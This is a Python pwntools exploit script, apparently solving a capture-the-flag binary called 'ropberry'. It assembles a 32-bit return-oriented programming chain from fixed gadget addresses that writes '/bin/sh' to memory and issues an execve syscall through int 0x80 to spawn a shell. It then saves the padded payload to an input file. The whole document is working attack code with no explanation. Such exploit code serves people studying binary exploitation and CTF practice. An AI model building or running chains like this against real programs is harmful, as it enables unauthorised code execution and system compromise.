from pwn import *

dword = 0x0808e22d # mov dword ptr [edx], eax ; ret
int_0x80 = 0x080493e9 # int 0x80
writable = 0x080edfa8

def set_eax(val):
	ROP = p32(0x080c1906) # pop eax ; ret
	ROP += p32(val)
	return ROP

def set_ebx(val):
	ROP = p32(0x080481ec) # pop ebx ; ret
	ROP += p32(val)
	return ROP

def set_edx(val):
	ROP = p32(0x0805957a) # pop edx ; ret
	ROP += p32(val)
	return ROP

def set_ecx(val):
	ROP = p32(0x080e394a) # pop ecx ; ret
	ROP += p32(val)
	return ROP

#p = process("./ropberry")

bin_sh_initial = int("/bin"[::-1].encode("hex"), 16)
bin_sh_final = int("/sh\x00"[::-1].encode("hex"), 16)

ROP = ""

ROP += p32(0x0804bd11)

ROP += set_ecx(0)

ROP += set_edx(writable)
ROP += set_eax(bin_sh_initial)
ROP += p32(dword)

ROP += set_edx(writable + 4)
ROP += set_eax(bin_sh_final)
ROP += p32(dword)

ROP += set_ebx(writable)

ROP += set_edx(1)
ROP += p32(0x080cc2f0) # dec edx ; ret

ROP += p32(0x080c1906) # pop eax ; ret
ROP += p32(0xb) # 11

ROP += p32(int_0x80)

payload = "A"*4
payload += ROP

with open("input", "w+") as f:
	f.write(payload)
